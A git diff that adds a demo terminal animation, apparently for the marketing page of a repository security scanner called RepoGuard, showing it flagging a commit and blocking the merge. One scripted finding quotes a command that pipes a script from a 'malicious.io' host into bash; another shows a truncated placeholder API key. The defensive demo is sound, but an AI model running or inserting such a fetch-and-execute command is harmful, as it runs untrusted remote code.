@@ -187,3 +187,34 @@ export const CHANGELOGS = [
         desc: "Initial release of RepoGuard on the GitHub App marketplace. Added core 12 detection rules spanning reverse shells, obfuscated payloads, and remote code executions.",
     },
 ];
+
+export const script = [
+    { type: "input", text: "git push origin main", delay: 800 },
+    { type: "output", text: "Enumerating objects: 5, done.", delay: 400 },
+    { type: "output", text: "Writing objects: 100% (3/3), 312 bytes | 312.00 KiB/s, done.", delay: 400 },
+    { type: "space", delay: 200 },
+    { type: "blue", text: "→ RepoGuard: scanning 3 changed files...", delay: 800 },
+    { type: "space", delay: 200 },
+    {
+      type: "finding",
+      level: "CRITICAL",
+      rule: "curl-pipe-bash",
+      file: "scripts/setup.sh",
+      match: "curl https://malicious.io/payload.sh | bash",
+      levelColor: "text-brand-red font-semibold",
+      delay: 1000
+    },
+    { type: "space", delay: 300 },
+    {
+      type: "finding",
+      level: "HIGH",
+      rule: "hardcoded-secret",
+      file: "src/config.ts",
+      match: 'api_key = "sk-prod-Xt9mK2..."',
+      levelColor: "text-brand-orange font-semibold",
+      delay: 1000
+    },
+    { type: "space", delay: 400 },
+    { type: "red", text: "✗ Check failed — 2 issue(s) found", delay: 600 },
+    { type: "fix-pr", text: "Merge blocked. Fix PR opened: ", pr: "#47 🔒 RepoGuard: Security fixes", delay: 2000 }
+  ];
